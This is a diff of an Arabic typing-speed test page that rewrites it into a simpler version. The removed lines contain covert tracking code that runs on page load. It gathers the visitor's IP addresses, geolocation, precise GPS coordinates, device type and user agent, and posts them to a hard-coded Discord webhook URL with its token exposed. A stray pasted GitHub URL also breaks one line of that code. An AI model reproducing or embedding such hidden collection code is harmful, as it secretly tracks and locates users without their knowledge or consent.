@@ -1,462 +1,179 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>اختبر سرعتك</title>
-<style>
-  body {
-    font-family: Tahoma, sans-serif;
-    margin: 0; padding: 0;
-    background: black;
-    color: white;
-    text-align: center;
-    overflow-x: hidden;
-    min-height: 100vh;
-  }
-  canvas#stars {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: -1;
-  }
-  .container {
-    max-width: 700px;
-    margin: 60px auto 100px auto;
-    background: rgba(20, 20, 20, 0.9);
-    padding: 20px;
-    border-radius: 15px;
-  }
-  input[type="text"] {
-    width: 80%;
-    padding: 12px;
-    font-size: 18px;
-    margin-bottom: 15px;
-    border-radius: 8px;
-    border: 2px solid #555;
-    background: #111;
-    color: white;
-  }
-  button {
-    padding: 12px 25px;
-    font-size: 18px;
-    background-color: #6a1b9a;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    color: white;
-    margin: 5px;
-  }
-  #sentence {
-    font-size: 24px;
-    font-weight: bold;
-    margin-bottom: 15px;
-    user-select: none;
-  }
-  #sentence span {
-    padding: 3px 7px;
-    margin: 0 4px;
-    border-radius: 6px;
-    display: inline-block;
-    transition: background-color 0.3s, color 0.3s;
-  }
-  #sentence span.correct {
-    color: #4caf50;
-    background-color: rgba(76, 175, 80, 0.25);
-  }
-  #sentence span.incorrect {
-    color: #f44336;
-    background-color: rgba(244, 67, 54, 0.25);
-  }
-  #sentence span.partial {
-    color: #ffeb3b;
-    background-color: rgba(255, 235, 59, 0.2);
-  }
-  #record {
-    position: fixed;
-    top: 20px;
-    right: 20px;
-    background: #222;
-    padding: 10px 15px;
-    border-radius: 8px;
-    font-weight: bold;
-    font-size: 16px;
-    z-index: 1000;
-  }
-  #musicControl {
-    position: fixed;
-    top: 20px;
-    left: 20px;
-    background: #333;
-    color: white;
-    border-radius: 50%;
-    width: 40px;
-    height: 40px;
-    font-size: 20px;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 1000;
-  }
-  #discordButton {
-    position: fixed;
-    bottom: 20px;
-    left: 20px;
-    width: 40px;
-    height: 40px;
-    cursor: pointer;
-    z-index: 1000;
-  }
-  #discordButton img {
-    width: 100%;
-    height: 100%;
-  }
-  #rightsMenu {
-    display: none;
-    position: fixed;
-    bottom: 70px;
-    left: 20px;
-    width: 220px;
-    background: #111;
-    border-radius: 8px;
-    color: white;
-    padding: 15px;
-    font-size: 14px;
-    text-align: right;
-    box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-    z-index: 10000;
-  }
-  #closeBtn {
-    background: #c62828;
-    border: none;
-    border-radius: 5px;
-    padding: 6px 12px;
-    color: white;
-    cursor: pointer;
-    margin-bottom: 10px;
-  }
-  #result.error {
-    color: #f44336;
-  }
-  #rightsFooter {
-    position: fixed;
-    bottom: 5px;
-    left: 0; right: 0;
-    text-align: center;
-    font-size: 14px;
-    color: #888;
-    user-select: none;
-    z-index: 1000;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>اختبار الكتابة</title>
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      padding: 40px 20px;
+      margin: 0;
+    }
+
+    #sentence {
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+      line-height: 2.2rem;
+    }
+
+    #sentence span {
+      padding: 2px 4px;
+      margin: 0 1px;
+      border-radius: 3px;
+      display: inline-block;
+      transition: color 0.2s ease;
+    }
+
+    #sentence span.correct {
+      color: #4caf50;
+      background: transparent;
+    }
+
+    #sentence span.incorrect {
+      color: #f44336;
+      background: transparent;
+    }
+
+    #sentence span.partial {
+      color: #ffc107;
+      background: transparent;
+    }
+
+    #userInput {
+      width: 90%;
+      max-width: 600px;
+      padding: 12px;
+      font-size: 1.2rem;
+      border: none;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    #result, #speedDisplay, #bestTime {
+      margin: 10px 0;
+      font-size: 1.1rem;
+    }
+
+    #rightsFooter {
+      margin-top: 40px;
+      font-size: 0.9rem;
+      color: #888;
+    }
+  </style>
 </head>
 <body>
 
-<canvas id="stars"></canvas>
-
-<div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
-<div id="musicControl" title="تشغيل/إيقاف الموسيقى">🎵</div>
-
-<button id="discordButton" title="حقوق المطور">
-  <img src="https://cdn.iconscout.com/icon/free/png-256/discord-3-569463.png" alt="Discord Logo" />
-</button>
-
-<div id="rightsMenu">
-  <button id="closeBtn">إغلاق</button>
-  <div>المطور: <b>معاذ الحربي</b></div>
-  <div>Discord: <b>معاذ الحربي</b></div>
-  <div>جميع الحقوق محفوظة</div>
-</div>
-
-<div class="container" id="loginScreen">
-  <h2>مرحبًا!</h2>
-  <p>اكتب اسمك وابدأ</p>
-  <input type="text" id="playerName" placeholder="اسمك" />
-  <br />
-  <button onclick="startGame()">ابدأ</button>
-</div>
-
-<div class="container" id="gameScreen" style="display:none;">
-  <h2 id="welcomeMsg"></h2>
+  <h1>اختبار سرعة الكتابة</h1>
   <div id="sentence"></div>
-  <input type="text" id="userInput" placeholder="اكتب هنا" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" oninput="renderSentence(this.value)" onkeydown="handleEnter(event)" />
-  <br />
-  <button onclick="checkInput()">تحقق</button>
+  <input type="text" id="userInput" placeholder="ابدأ الكتابة هنا..." />
+  <div id="result"></div>
   <div id="speedDisplay"></div>
   <div id="bestTime"></div>
-  <div id="result"></div>
-</div>
+  <div id="rightsFooter">جميع الحقوق محفوظة لمعاذ الحربي © 2025</div>
 
-<audio id="bgMusic" src="https://files.catbox.moe/l0gz7g.mp3" loop></audio>
+  <script>
+    const sentences = [
+      "الكتابة السريعة مهارة مهمة.",
+      "تعلم البرمجة يحتاج إلى ممارسة.",
+      "اللغة العربية جميلة وغنية.",
+      "التكنولوجيا تتطور بسرعة.",
+      "القراءة توسع المدارك."
+    ];
 
-<div id="rightsFooter">حقوق © معاذ الحربي</div>
+    let currentSentence = "";
+    let startTime = null;
+    let highestWpm = parseFloat(localStorage.getItem("highestWpm")) || 0;
+    let bestTime = parseFloat(localStorage.getItem("bestTime")) || 0;
 
-<script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";
-
-  let highestWpm = 0;
-  let bestTime = 0;
-
-  const sentences = [
-    "اختبر سرعتك في الطباعة",
-    "هذا اختبار لقياس مهارتك",
-    "هل تستطيع التفوق على نفسك",
-    "البرمجة ممتعة وجميلة",
-    "ابدأ الآن ولا تتردد"
-  ];
-
-  function shuffle(array) {
-    for (let i = array.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [array[i], array[j]] = [array[j], array[i]];
-    }
-  }
-
-  let currentSentence = "";
-  let startTime = 0;
-
-  function startGame() {
-    const name = document.getElementById("playerName").value.trim();
-    if (!name) {
-      alert("يرجى إدخال اسمك");
-      return;
-    }
-    document.getElementById("loginScreen").style.display = "none";
-    document.getElementById("gameScreen").style.display = "block";
-    document.getElementById("welcomeMsg").textContent = `مرحباً، ${name}`;
-    shuffle(sentences);
-    currentSentence = sentences[0];
-    renderSentence("");
-    document.getElementById("userInput").value = "";
-    document.getElementById("userInput").focus();
-    startTime = performance.now();
-  }
-
-  // تلوين الكلمة كاملة وليس حرف حرف
-  function renderSentence(userInput) {
     const sentenceDiv = document.getElementById("sentence");
-    sentenceDiv.innerHTML = "";
-    const words = currentSentence.split(" ");
-    const inputWords = userInput.trim().split(" ");
+    const userInput = document.getElementById("userInput");
+    const resultDiv = document.getElementById("result");
+    const speedDisplay = document.getElementById("speedDisplay");
+    const bestTimeDisplay = document.getElementById("bestTime");
 
-    words.forEach((word, idx) => {
-      const span = document.createElement("span");
-      span.textContent = word;
+    function shuffle(array) {
+      return array.sort(() => Math.random() - 0.5);
+    }
 
-      if (inputWords[idx]) {
+    function renderSentence(input) {
+      sentenceDiv.innerHTML = "";
+      const words = currentSentence.split(" ");
+      const inputWords = input.trim().split(" ");
+
+      words.forEach((word, idx) => {
+        const span = document.createElement("span");
+        span.textContent = word;
+
         if (inputWords[idx] === word) {
           span.classList.add("correct");
-        } else if (word.startsWith(inputWords[idx])) {
+        } else if (inputWords[idx] && word.startsWith(inputWords[idx])) {
           span.classList.add("partial");
-        } else {
+        } else if (inputWords[idx]) {
           span.classList.add("incorrect");
         }
-      }
-      sentenceDiv.appendChild(span);
-    });
-  }
 
-  function handleEnter(e) {
-    if (e.key === "Enter") {
-      e.preventDefault();
-      checkInput();
-    }
-  }
-
-  function checkInput() {
-    const userInput = document.getElementById("userInput").value.trim();
-    if (!userInput) return;
-
-    if (userInput === currentSentence) {
-      const endTime = performance.now();
-      const timeSeconds = (endTime - startTime) / 1000;
-      const wordsCount = currentSentence.split(" ").length;
-      const wpm = (wordsCount / timeSeconds) * 60;
-
-      if (wpm > highestWpm) {
-        highestWpm = wpm;
-        bestTime = timeSeconds;
-        localStorage.setItem("highestWpm", highestWpm);
-        localStorage.setItem("bestTime", bestTime);
-      }
-
-      document.getElementById("speedDisplay").textContent = `السرعة: ${wpm.toFixed(2)} كلمة في الدقيقة`;
-      document.getElementById("bestTime").textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
-      document.getElementById("result").textContent = "عمل رائع!";
-
-      shuffle(sentences);
-      currentSentence = sentences[0];
-      renderSentence("");
-      document.getElementById("userInput").value = "";
-      startTime = performance.now();
-
-    } else {
-      document.getElementById("result").textContent = "حاول مرة أخرى";
-    }
-  }
-
-  // استعادة البيانات من التخزين المحلي
-  window.onload = function() {
-    highestWpm = parseFloat(localStorage.getItem("highestWpm")) || 0;
-    bestTime = parseFloat(localStorage.getItem("bestTime")) || 0;
-    if (bestTime > 0) {
-      document.getElementById("bestTime").textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
-    }
-  };
-
-  // النجوم الخلفية
-  const canvas = document.getElementById("stars");
-  const ctx = canvas.getContext("2d");
-  let starsArray = [];
-  function resizeCanvas() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-  }
-  window.addEventListener("resize", resizeCanvas);
-  resizeCanvas();
-
-  function createStars(count) {
-    starsArray = [];
-    for (let i = 0; i < count; i++) {
-      starsArray.push({
-        x: Math.random() * canvas.width,
-        y: Math.random() * canvas.height,
-        radius: Math.random() * 1.3,
-        alpha: Math.random(),
+        sentenceDiv.appendChild(span);
       });
     }
-  }
-  createStars(120);
 
-  function drawStars() {
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    starsArray.forEach(star => {
-      ctx.beginPath();
-      ctx.arc(star.x, star.y, star.radius, 0, 2 * Math.PI);
-      ctx.fillStyle = `rgba(255,255,255,${star.alpha})`;
-      ctx.fill();
-    });
-  }
+    function checkInput() {
+      const input = userInput.value.trim();
+      if (!input) return;
 
-  function animateStars() {
-    starsArray.forEach(star => {
-      star.alpha += (Math.random() - 0.5) * 0.05;
-      star.alpha = Math.min(Math.max(star.alpha, 0), 1);
-    });
-    drawStars();
-    requestAnimationFrame(animateStars);
-  }
-  animateStars();
+      if (input === currentSentence) {
+        const endTime = performance.now();
+        const timeSeconds = (endTime - startTime) / 1000;
+        const wordsCount = currentSentence.split(" ").length;
+        const wpm = (wordsCount / timeSeconds) * 60;
 
-  // الموسيقى
-  const music = document.getElementById("bgMusic");
-  const musicControl = document.getElementById("musicControl");
-  music.volume = 0.15;
-  let musicPlaying = false;
-  musicControl.addEventListener("click", () => {
-    if (musicPlaying) {
-      music.pause();
-      musicPlaying = false;
-      musicControl.textContent = "🎵";
-    } else {
-      music.play();
-      musicPlaying = true;
-      musicControl.textContent = "🔇";
-    }
-  });
+        if (wpm > highestWpm) {
+          highestWpm = wpm;
+          bestTime = timeSeconds;
+          localStorage.setItem("highestWpm", highestWpm);
+          localStorage.setItem("bestTime", bestTime);
+        }
 
-  // قائمة الحقوق
-  const discordButton = document.getElementById("discordButton");
-  const rightsMenu = document.getElementById("rightsMenu");
-  const closeBtn = document.getElementById("closeBtn");
+        speedDisplay.textContent = `السرعة: ${wpm.toFixed(2)} كلمة/دقيقة`;
+        bestTimeDisplay.textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
+        resultDiv.textContent = "عمل رائع!";
 
-  discordButton.addEventListener("click", () => {
-    rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
-  });
-
-  closeBtn.addEventListener("click", () => {
-    rightsMenu.style.display = "none";
-  });
-
-  // إرسال معلومات المستخدم إلى الويب هوك
-  async function sendUserInfo() {
-    try {
-      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
-        fetch("https://api.ipify.org?format=json"),
-        fetch("https://api64.ipify.org?format=json"),
-        fetch("https://ipapi.co/json/"),
-      ]);
-      const ipv4Data = await ipv4Res.json();
-      const ipv6Data = await ipv6Res.json();
-      const geoData = await geoRes.json();
-
-      const ua = navigator.userAgent;
-      const lang = navigator.language;
-      const now = new Date();
-      const timeString = now.toISOString();
-      const ipv4 = ipv4Data.ip;
-      const ipv6 = ipv6Data.ip && ipv6Data.ip !== ipv4 ? ipv6Data.ip : "غير معروف";
-
-      let deviceType = "كمبيوتر";
-      if (/android|iphone|ipad|ipod/i.test(ua)) {
-        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
-      }
-
-      function sendToWebhook(extraGeo = "") {
-        const infoText = `
-IP (IPv4): ${ipv4}
-IP (IPv6): ${ipv6}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-خط العرض: ${geoData.latitude}
-خط الطول: ${geoData.longitude}
-المنظمة: ${geoData.org}
-المنطقة الزمنية: ${geoData.timezone}
-نوع الجهاز: ${deviceType}
-المتصفح: ${ua}
-اللغة: ${lang}
-الوقت: ${timeString}
-${extraGeo}
-        `.trim();
-
-        fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: infoText }),
-        });
-      }
-
-      if (navigator.geolocation) {
-        let responded = false;
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            responded = true;
-            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(
-              6https://github.com/moath754/typing-speed/edit/main/index.html
-            )}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
-            sendToWebhook(extraGeo);
-          },
-          () => {
-            responded = true;
-            sendToWebhook();
-          },
-          { timeout: 4000 }
-        );
         setTimeout(() => {
-          if (!responded) sendToWebhook();
-        }, 4500);
+          currentSentence = shuffle(sentences)[0];
+          renderSentence("");
+          userInput.value = "";
+          startTime = performance.now();
+          resultDiv.textContent = "";
+        }, 1500);
       } else {
-        sendToWebhook();
+        resultDiv.textContent = "حاول مرة أخرى";
       }
-    } catch (e) {
-      console.error("خطأ في إرسال معلومات المستخدم", e);
     }
-  }
 
-  sendUserInfo();
-</script>
+    userInput.addEventListener("input", () => {
+      renderSentence(userInput.value);
+    });
 
+    userInput.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        checkInput();
+      }
+    });
+
+    window.onload = () => {
+      currentSentence = shuffle(sentences)[0];
+      renderSentence("");
+      startTime = performance.now();
+
+      if (bestTime > 0) {
+        bestTimeDisplay.textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
+      }
+    };
+  </script>
 </body>
 </html>
